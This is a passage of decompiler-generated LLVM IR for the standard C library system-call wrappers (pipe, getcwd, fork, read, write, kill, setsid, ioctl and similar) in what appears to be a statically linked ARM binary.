  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11ba0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11bb4 = load i32, i32* @r7, align 4
  store i32 %v3_11bb4, i32* %stack_var_-8, align 4
  %v0_11bc0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11bc0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11bc0, -4095
  br i1 %tmp, label %dec_label_pc_11be0, label %dec_label_pc_11bd0

dec_label_pc_11bd0:                               ; preds = %entry
  %v0_11bd0 = call i32 @__GI___errno_location()
  %v0_11bd4 = load i32, i32* %r7.global-to-local, align 4
  %v1_11bd4 = sub i32 0, %v0_11bd4
  %v2_11bd8 = inttoptr i32 %v0_11bd0 to i32*
  store i32 %v1_11bd4, i32* %v2_11bd8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11be0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11be0

dec_label_pc_11be0:                               ; preds = %entry, %dec_label_pc_11bd0
  %v1_11be4 = phi i32 [ %v0_11bc0, %entry ], [ -1, %dec_label_pc_11bd0 ]
  %v2_11be0 = phi i32 [ %v3_11bb4, %entry ], [ %v2_11be0.pre, %dec_label_pc_11bd0 ]
  store i32 %v2_11be0, i32* @r7, align 4
  ret i32 %v1_11be4

; uselistorder directives
  uselistorder i32 %v0_11bc0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11be0, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_11be8 = load i32, i32* @r4, align 4
  %v6_11be8 = load i32, i32* @r5, align 4
  %v9_11be8 = load i32, i32* @r6, align 4
  %v12_11be8 = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  %v2_11bec = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r4, align 4
  %v2_11bfc = icmp eq i32 %arg1, 0
  br i1 %v2_11bec, label %dec_label_pc_11bfc, label %dec_label_pc_11c2c

dec_label_pc_11bfc:                               ; preds = %entry
  br i1 %v2_11bfc, label %dec_label_pc_11c18, label %dec_label_pc_11c04

dec_label_pc_11c04:                               ; preds = %dec_label_pc_11bfc
  %v0_11c04 = call i32 @__GI___errno_location()
  %v0_11c08 = load i32, i32* @r6, align 4
  store i32 %v0_11c08, i32* @r4, align 4
  %v2_11c10 = inttoptr i32 %v0_11c04 to i32*
  store i32 22, i32* %v2_11c10, align 4
  br label %dec_label_pc_11cc4

dec_label_pc_11c18:                               ; preds = %dec_label_pc_11bfc
  %v0_11c18 = call i32 @__GI_getpagesize()
  %v5_11c20 = icmp slt i32 %v0_11c18, 4096
  br i1 %v5_11c20, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_11c18
  store i32 %v0_11c18, i32* @r7, align 4
  br label %dec_label_pc_11c3c

bb16:                                             ; preds = %dec_label_pc_11c18
  store i32 4096, i32* @r7, align 4
  br label %dec_label_pc_11c3c

dec_label_pc_11c2c:                               ; preds = %entry
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_11bfc, label %dec_label_pc_11c3c, label %bb17

bb17:                                             ; preds = %dec_label_pc_11c2c
  br label %dec_label_pc_11c50

dec_label_pc_11c3c:                               ; preds = %dec_label_pc_11c2c, %bb, %bb16
  %v0_11c3c = phi i32 [ %v0_11c18, %bb ], [ 4096, %bb16 ], [ %arg2, %dec_label_pc_11c2c ]
  %v1_11c40 = call i32 @malloc(i32 %v0_11c3c)
  %v2_11c44 = icmp eq i32 %v1_11c40, 0
  br i1 %v2_11c44, label %dec_label_pc_11cc0, label %dec_label_pc_11c4c

dec_label_pc_11c4c:                               ; preds = %dec_label_pc_11c3c
  br label %dec_label_pc_11c50

dec_label_pc_11c50:                               ; preds = %bb17, %dec_label_pc_11c4c
  %storemerge = phi i32 [ %arg1, %bb17 ], [ %v1_11c40, %dec_label_pc_11c4c ]
  %v0_11c94 = phi i32 [ %arg1, %bb17 ], [ %v1_11c40, %dec_label_pc_11c4c ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 %v0_11c94, i32* @r7, align 4
  %tmp = icmp ult i32 %v0_11c94, -4095
  br i1 %tmp, label %dec_label_pc_11c7c, label %dec_label_pc_11c6c

dec_label_pc_11c6c:                               ; preds = %dec_label_pc_11c50
  %v0_11c6c = call i32 @__GI___errno_location()
  %v0_11c70 = load i32, i32* @r7, align 4
  %v1_11c70 = sub i32 0, %v0_11c70
  %v2_11c74 = inttoptr i32 %v0_11c6c to i32*
  store i32 %v1_11c70, i32* %v2_11c74, align 4
  br label %dec_label_pc_11cac

dec_label_pc_11c7c:                               ; preds = %dec_label_pc_11c50
  %v1_11c7c = icmp slt i32 %v0_11c94, 0
  br i1 %v1_11c7c, label %dec_label_pc_11cac, label %dec_label_pc_11c84

dec_label_pc_11c84:                               ; preds = %dec_label_pc_11c7c
  %v0_11c84 = load i32, i32* @r4, align 4
  %v2_11c84 = icmp eq i32 %v0_11c84, 0
  br i1 %v2_11c84, label %bb18, label %dec_label_pc_11ca0.thread7

dec_label_pc_11ca0.thread7:                       ; preds = %dec_label_pc_11c84
  br label %dec_label_pc_11cc4

bb18:                                             ; preds = %dec_label_pc_11c84
  %v1_11c88 = load i32, i32* @r6, align 4
  %v3_11c88 = icmp eq i32 %v1_11c88, 0
  br i1 %v3_11c88, label %dec_label_pc_11ca0, label %dec_label_pc_11ca0.thread

dec_label_pc_11ca0.thread:                        ; preds = %bb18
  br label %bb19

dec_label_pc_11ca0:                               ; preds = %bb18
  %v2_11c98 = inttoptr i32 %v0_11c94 to i32*
  %v3_11c98 = call i32 @realloc(i32* %v2_11c98, i32 %v0_11c94)
  store i32 %v3_11c98, i32* @r4, align 4
  %v2_11ca0 = icmp eq i32 %v3_11c98, 0
  br i1 %v2_11ca0, label %dec_label_pc_11ca0.bb19_crit_edge, label %dec_label_pc_11cc4

dec_label_pc_11ca0.bb19_crit_edge:                ; preds = %dec_label_pc_11ca0
  %v1_11ca4.pre = load i32, i32* @r5, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_11ca0.bb19_crit_edge, %dec_label_pc_11ca0.thread
  %v1_11ca4 = phi i32 [ %v1_11ca4.pre, %dec_label_pc_11ca0.bb19_crit_edge ], [ %v0_11c94, %dec_label_pc_11ca0.thread ]
  store i32 %v1_11ca4, i32* @r4, align 4
  br label %dec_label_pc_11cc4

dec_label_pc_11cac:                               ; preds = %dec_label_pc_11c7c, %dec_label_pc_11c6c
  %v0_11cac = load i32, i32* @r4, align 4
  %v2_11cac = icmp eq i32 %v0_11cac, 0
  br i1 %v2_11cac, label %dec_label_pc_11cb4, label %dec_label_pc_11cc0

dec_label_pc_11cb4:                               ; preds = %dec_label_pc_11cac
  %v0_11cb4 = load i32, i32* @r5, align 4
  store i32 %v0_11cb4, i32* @r0, align 4
  %v0_11cb8 = call i32 @free()
  br label %dec_label_pc_11cc4

dec_label_pc_11cc0:                               ; preds = %dec_label_pc_11cac, %dec_label_pc_11c3c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11cc4

dec_label_pc_11cc4:                               ; preds = %dec_label_pc_11ca0.thread7, %bb19, %dec_label_pc_11ca0, %dec_label_pc_11cb4, %dec_label_pc_11c04, %dec_label_pc_11cc0
  %v0_11cc4 = load i32, i32* @r4, align 4
  store i32 %v3_11be8, i32* @r4, align 4
  store i32 %v6_11be8, i32* @r5, align 4
  store i32 %v9_11be8, i32* @r6, align 4
  store i32 %v12_11be8, i32* @r7, align 4
  ret i32 %v0_11cc4

; uselistorder directives
  uselistorder i32 %v0_11c94, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v1_11c40, { 1, 0, 2 }
  uselistorder i32 %v0_11c18, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_11cc4, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_11c50, { 1, 0 }
  uselistorder label %dec_label_pc_11c3c, { 0, 2, 1 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_11ce0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 100) to i32*), align 4
  %v1_11ce4 = inttoptr i32 %v4_11ce0 to i32*
  %v2_11ce4 = load i32, i32* %v1_11ce4, align 4
  %v2_11ce8 = icmp eq i32 %v2_11ce4, 0
  br i1 %v2_11ce8, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_11cf0 = phi i32 [ %v2_11ce4, %entry ], [ 4096, %bb ]
  ret i32 %v1_11cf0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_getpid() local_unnamed_addr {
entry:
  %v1_11d0c = load i32, i32* @r0, align 4
  ret i32 %v1_11d0c
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_11d14 = ptrtoint i32* %stack_var_-16 to i32
  %v2_11d24 = call i32 @gettimeofday(i32 %v2_11d14, i32 0)
  %v2_11d28 = load i32, i32* %stack_var_-16, align 4
  %v2_11d2c = icmp eq i32* %arg1, null
  br i1 %v2_11d2c, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_11d28, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_11d28

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11d74, label %dec_label_pc_11d64

dec_label_pc_11d64:                               ; preds = %entry
  %v0_11d64 = call i32 @__GI___errno_location()
  %v0_11d68 = load i32, i32* %r4.global-to-local, align 4
  %v1_11d68 = sub i32 0, %v0_11d68
  %v2_11d6c = inttoptr i32 %v0_11d64 to i32*
  store i32 %v1_11d68, i32* %v2_11d6c, align 4
  br label %dec_label_pc_11d74

dec_label_pc_11d74:                               ; preds = %entry, %dec_label_pc_11d64
  %v1_11d7c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_11d64 ]
  ret i32 %v1_11d7c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11d74, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11d80 = load i32, i32* @r7, align 4
  store i32 %v3_11d80, i32* %stack_var_-8, align 4
  %v0_11d8c = load i32, i32* @r0, align 4
  store i32 %v0_11d8c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11d8c, -4095
  br i1 %tmp, label %dec_label_pc_11dac, label %dec_label_pc_11d9c

dec_label_pc_11d9c:                               ; preds = %entry
  %v0_11d9c = call i32 @__GI___errno_location()
  %v0_11da0 = load i32, i32* %r7.global-to-local, align 4
  %v1_11da0 = sub i32 0, %v0_11da0
  %v2_11da4 = inttoptr i32 %v0_11d9c to i32*
  store i32 %v1_11da0, i32* %v2_11da4, align 4
  %v2_11dac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11dac

dec_label_pc_11dac:                               ; preds = %entry, %dec_label_pc_11d9c
  %v1_11db0 = phi i32 [ %v0_11d8c, %entry ], [ -1, %dec_label_pc_11d9c ]
  %v2_11dac = phi i32 [ %v3_11d80, %entry ], [ %v2_11dac.pre, %dec_label_pc_11d9c ]
  store i32 %v2_11dac, i32* @r7, align 4
  ret i32 %v1_11db0

; uselistorder directives
  uselistorder i32 %v0_11d8c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11dac, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_11dc0 = load i32, i32* @r0, align 4
  %v1_11dc0 = load i32, i32* @r1, align 4
  %v2_11dc0 = call i32 @wait4(i32 %v0_11dc0, i32 %v1_11dc0)
  ret i32 %v2_11dc0
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11e00, label %dec_label_pc_11df0

dec_label_pc_11df0:                               ; preds = %entry
  %v0_11df0 = call i32 @__GI___errno_location()
  %v0_11df4 = load i32, i32* %r4.global-to-local, align 4
  %v1_11df4 = sub i32 0, %v0_11df4
  %v2_11df8 = inttoptr i32 %v0_11df0 to i32*
  store i32 %v1_11df4, i32* %v2_11df8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11e00

dec_label_pc_11e00:                               ; preds = %entry, %dec_label_pc_11df0
  %v0_11e00 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_11df0 ]
  ret i32 %v0_11e00

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11e00, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11e10 = load i32, i32* @r7, align 4
  store i32 %v3_11e10, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11e38, label %dec_label_pc_11e28

dec_label_pc_11e28:                               ; preds = %entry
  %v0_11e28 = call i32 @__GI___errno_location()
  %v0_11e2c = load i32, i32* %r7.global-to-local, align 4
  %v1_11e2c = sub i32 0, %v0_11e2c
  %v2_11e30 = inttoptr i32 %v0_11e28 to i32*
  store i32 %v1_11e2c, i32* %v2_11e30, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_11e3c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11e38

dec_label_pc_11e38:                               ; preds = %entry, %dec_label_pc_11e28
  %v2_11e3c = phi i32 [ %v3_11e10, %entry ], [ %v2_11e3c.pre, %dec_label_pc_11e28 ]
  %v0_11e38 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_11e28 ]
  store i32 %v2_11e3c, i32* @r7, align 4
  ret i32 %v0_11e38

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11e38, { 1, 0 }
}

define i32 @__GI_read(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11e44 = load i32, i32* @r7, align 4
  store i32 %v3_11e44, i32* %stack_var_-8, align 4
  %v0_11e50 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11e50, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11e50, -4095
  br i1 %tmp, label %dec_label_pc_11e70, label %dec_label_pc_11e60

dec_label_pc_11e60:                               ; preds = %entry
  %v0_11e60 = call i32 @__GI___errno_location()
  %v0_11e64 = load i32, i32* %r7.global-to-local, align 4
  %v1_11e64 = sub i32 0, %v0_11e64
  %v2_11e68 = inttoptr i32 %v0_11e60 to i32*
  store i32 %v1_11e64, i32* %v2_11e68, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11e70.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11e70

dec_label_pc_11e70:                               ; preds = %entry, %dec_label_pc_11e60
  %v1_11e74 = phi i32 [ %v0_11e50, %entry ], [ -1, %dec_label_pc_11e60 ]
  %v2_11e70 = phi i32 [ %v3_11e44, %entry ], [ %v2_11e70.pre, %dec_label_pc_11e60 ]
  store i32 %v2_11e70, i32* @r7, align 4
  ret i32 %v1_11e74

; uselistorder directives
  uselistorder i32 %v0_11e50, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11e70, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_11e7c = ptrtoint i32* %stack_var_-16 to i32
  %v2_11e88 = call i32 @getrlimit(i32 7, i32 %v2_11e7c)
  %v1_11e8c = icmp slt i32 %v2_11e88, 0
  %v5_11e90 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_11e8c, i32 256, i32 %v5_11e90
  ret i32 %storemerge
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11ea4 = load i32, i32* @r7, align 4
  store i32 %v3_11ea4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11ecc, label %dec_label_pc_11ebc

dec_label_pc_11ebc:                               ; preds = %entry
  %v0_11ebc = call i32 @__GI___errno_location()
  %v0_11ec0 = load i32, i32* %r7.global-to-local, align 4
  %v1_11ec0 = sub i32 0, %v0_11ec0
  %v2_11ec4 = inttoptr i32 %v0_11ebc to i32*
  store i32 %v1_11ec0, i32* %v2_11ec4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_11ed0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11ecc

dec_label_pc_11ecc:                               ; preds = %entry, %dec_label_pc_11ebc
  %v2_11ed0 = phi i32 [ %v3_11ea4, %entry ], [ %v2_11ed0.pre, %dec_label_pc_11ebc ]
  %v0_11ecc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_11ebc ]
  store i32 %v2_11ed0, i32* @r7, align 4
  ret i32 %v0_11ecc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11ecc, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11ed8 = load i32, i32* @r7, align 4
  store i32 %v3_11ed8, i32* %stack_var_-8, align 4
  %v0_11ee4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11ee4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11ee4, -4095
  br i1 %tmp, label %dec_label_pc_11f04, label %dec_label_pc_11ef4

dec_label_pc_11ef4:                               ; preds = %entry
  %v0_11ef4 = call i32 @__GI___errno_location()
  %v0_11ef8 = load i32, i32* %r7.global-to-local, align 4
  %v1_11ef8 = sub i32 0, %v0_11ef8
  %v2_11efc = inttoptr i32 %v0_11ef4 to i32*
  store i32 %v1_11ef8, i32* %v2_11efc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11f04.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11f04

dec_label_pc_11f04:                               ; preds = %entry, %dec_label_pc_11ef4
  %v1_11f08 = phi i32 [ %v0_11ee4, %entry ], [ -1, %dec_label_pc_11ef4 ]
  %v2_11f04 = phi i32 [ %v3_11ed8, %entry ], [ %v2_11f04.pre, %dec_label_pc_11ef4 ]
  store i32 %v2_11f04, i32* @r7, align 4
  ret i32 %v1_11f08

; uselistorder directives
  uselistorder i32 %v0_11ee4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f04, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_11f48 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11f48, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11f48, -4095
  br i1 %tmp, label %dec_label_pc_11f68, label %dec_label_pc_11f58

dec_label_pc_11f58:                               ; preds = %entry
  %v0_11f58 = call i32 @__GI___errno_location()
  %v0_11f5c = load i32, i32* %r7.global-to-local, align 4
  %v1_11f5c = sub i32 0, %v0_11f5c
  %v2_11f60 = inttoptr i32 %v0_11f58 to i32*
  store i32 %v1_11f5c, i32* %v2_11f60, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11f68

dec_label_pc_11f68:                               ; preds = %entry, %dec_label_pc_11f58
  %v1_11f74 = phi i32 [ %v0_11f48, %entry ], [ -1, %dec_label_pc_11f58 ]
  ret i32 %v1_11f74

; uselistorder directives
  uselistorder i32 %v0_11f48, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f68, { 1, 0 }
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_11fb4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11fb4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11fb4, -4095
  br i1 %tmp, label %dec_label_pc_11fd4, label %dec_label_pc_11fc4

dec_label_pc_11fc4:                               ; preds = %entry
  %v0_11fc4 = call i32 @__GI___errno_location()
  %v0_11fc8 = load i32, i32* %r7.global-to-local, align 4
  %v1_11fc8 = sub i32 0, %v0_11fc8
  %v2_11fcc = inttoptr i32 %v0_11fc4 to i32*
  store i32 %v1_11fc8, i32* %v2_11fcc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11fd4

dec_label_pc_11fd4:                               ; preds = %entry, %dec_label_pc_11fc4
  %v1_11fe0 = phi i32 [ %v0_11fb4, %entry ], [ -1, %dec_label_pc_11fc4 ]
  ret i32 %v1_11fe0

; uselistorder directives
  uselistorder i32 %v0_11fb4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11fd4, { 1, 0 }
}

define i32 @__GI_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11fe4 = load i32, i32* @r7, align 4
  store i32 %v3_11fe4, i32* %stack_var_-8, align 4
  %v0_11ff0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11ff0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11ff0, -4095
  br i1 %tmp, label %dec_label_pc_12010, label %dec_label_pc_12000

dec_label_pc_12000:                               ; preds = %entry
  %v0_12000 = call i32 @__GI___errno_location()
  %v0_12004 = load i32, i32* %r7.global-to-local, align 4
  %v1_12004 = sub i32 0, %v0_12004
  %v2_12008 = inttoptr i32 %v0_12000 to i32*
  store i32 %v1_12004, i32* %v2_12008, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12010.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12010

dec_label_pc_12010:                               ; preds = %entry, %dec_label_pc_12000
  %v1_12014 = phi i32 [ %v0_11ff0, %entry ], [ -1, %dec_label_pc_12000 ]
  %v2_12010 = phi i32 [ %v3_11fe4, %entry ], [ %v2_12010.pre, %dec_label_pc_12000 ]
  store i32 %v2_12010, i32* @r7, align 4
  ret i32 %v1_12014

; uselistorder directives
  uselistorder i32 %v0_11ff0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12010, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12018 = load i32, i32* @r7, align 4
  store i32 %v3_12018, i32* %stack_var_-8, align 4
  %v0_12024 = load i32, i32* @r0, align 4
  store i32 %v0_12024, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12024, -4095
  br i1 %tmp, label %dec_label_pc_12044, label %dec_label_pc_12034

dec_label_pc_12034:                               ; preds = %entry
  %v0_12034 = call i32 @__GI___errno_location()
  %v0_12038 = load i32, i32* %r7.global-to-local, align 4
  %v1_12038 = sub i32 0, %v0_12038
  %v2_1203c = inttoptr i32 %v0_12034 to i32*
  store i32 %v1_12038, i32* %v2_1203c, align 4
  %v2_12044.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12044

dec_label_pc_12044:                               ; preds = %entry, %dec_label_pc_12034
  %v1_12048 = phi i32 [ %v0_12024, %entry ], [ -1, %dec_label_pc_12034 ]
  %v2_12044 = phi i32 [ %v3_12018, %entry ], [ %v2_12044.pre, %dec_label_pc_12034 ]
  store i32 %v2_12044, i32* @r7, align 4
  ret i32 %v1_12048

; uselistorder directives
  uselistorder i32 %v0_12024, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12044, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_1204c = load i32, i32* @r3, align 4
  store i32 %v9_1204c, i32* %stack_var_-4, align 4
  %v2_12058 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12058, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1208c, label %dec_label_pc_1207c

dec_label_pc_1207c:                               ; preds = %entry
  %v0_1207c = call i32 @__GI___errno_location()
  %v0_12080 = load i32, i32* %r7.global-to-local, align 4
  %v1_12080 = sub i32 0, %v0_12080
  store i32 %v1_12080, i32* @r3, align 4
  %v2_12084 = inttoptr i32 %v0_1207c to i32*
  store i32 %v1_12080, i32* %v2_12084, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1208c

dec_label_pc_1208c:                               ; preds = %entry, %dec_label_pc_1207c
  %v0_1208c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1207c ]
  ret i32 %v0_1208c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1208c, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_120a4.outer

dec_label_pc_120a4.outer:                         ; preds = %dec_label_pc_120bc, %entry
  %v0_120a4.ph = phi i32 [ %v0_120a4.pre.pre, %dec_label_pc_120bc ], [ %arg1, %entry ]
  %tmp = icmp ult i32 %v0_120a4.ph, -4095
  br label %dec_label_pc_120a4

dec_label_pc_120a4:                               ; preds = %dec_label_pc_120a4.outer, %dec_label_pc_120a4
  br i1 %tmp, label %dec_label_pc_120a4, label %dec_label_pc_120bc

dec_label_pc_120bc:                               ; preds = %dec_label_pc_120a4
  %v0_120bc = call i32 @__GI___errno_location()
  %v1_120c0 = sub i32 0, %v0_120a4.ph
  %v2_120c4 = inttoptr i32 %v0_120bc to i32*
  store i32 %v1_120c0, i32* %v2_120c4, align 4
  %v0_120a4.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_120a4.outer

; uselistorder directives
  uselistorder i32 %v0_120a4.ph, { 1, 0 }
  uselistorder label %dec_label_pc_120a4, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_120cc = load i32, i32* @r7, align 4
  store i32 %v3_120cc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_120f8, label %dec_label_pc_120e8

dec_label_pc_120e8:                               ; preds = %entry
  %v0_120e8 = call i32 @__GI___errno_location()
  %v0_120ec = load i32, i32* %r7.global-to-local, align 4
  %v1_120ec = sub i32 0, %v0_120ec
  %v2_120f0 = inttoptr i32 %v0_120e8 to i32*
  store i32 %v1_120ec, i32* %v2_120f0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_120fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_120f8

dec_label_pc_120f8:                               ; preds = %entry, %dec_label_pc_120e8
  %v2_120fc = phi i32 [ %v3_120cc, %entry ], [ %v2_120fc.pre, %dec_label_pc_120e8 ]
  %v0_120f8 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_120e8 ]
